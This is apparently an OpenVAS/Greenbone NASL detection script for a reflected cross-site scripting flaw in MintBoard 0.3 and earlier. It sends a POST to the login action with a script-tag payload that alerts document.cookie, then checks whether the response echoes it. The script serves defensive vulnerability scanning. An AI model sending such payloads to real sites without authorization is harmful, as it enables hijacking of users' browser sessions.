if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803828" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-07-18 12:41:03 +0530 (Thu, 18 Jul 2013)" );
	script_name( "MintBoard Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is running MintBoard and is prone to a cross-site scripting
  vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted data via HTTP POST request and checks whether it is able to
  read the cookie or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "Input passed via 'name' and 'pass' POST parameters to 'signup' or 'login'
  action upon submission to the index.php script is not properly sanitised
  before being returned to the user." );
	script_tag( name: "affected", value: "MintBoard 0.3 and prior." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2013/Jul/101" );
	script_xref( name: "URL", value: "http://www.censimentoartisticoromano.it/category/exploit/webapps" );
	script_xref( name: "URL", value: "https://www.mavitunasecurity.com/xss-vulnerabilities-in-mintboard" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/mintboard-03-cross-site-scripting" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
vtstrings = get_vt_strings();
for dir in nasl_make_list_unique( "/", "/mintboard", "/forum", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: port );
	if(ContainsString( res, ">Mintboard" ) && ContainsString( res, ">Forums" )){
		url = dir + "/index.php?login";
		postData = "name=\"><script>alert(document.cookie)</script>&pass=" + vtstrings["default"];
		sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData, "\\r\\n" );
		rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie)</script>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

